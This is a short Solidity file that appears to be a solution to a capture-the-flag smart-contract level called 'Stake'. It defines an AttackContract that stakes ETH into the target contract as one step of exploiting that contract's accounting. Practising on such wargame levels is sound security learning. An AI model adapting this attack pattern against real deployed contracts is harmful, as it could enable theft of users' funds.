// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                        LEVEL 31 - STAKE                      │
// ================================================================
interface IStake {
    function StakeETH() external payable;
}

contract AttackContract {
    IStake private immutable stake;

    constructor(address _stakeContract) payable {
        stake = IStake(_stakeContract);
    }

    function attack() external payable {
        // Become a staker with 0.001 ETH + 2 wei (1 will be left behind)
        stake.StakeETH{value: msg.value}();
    }
}
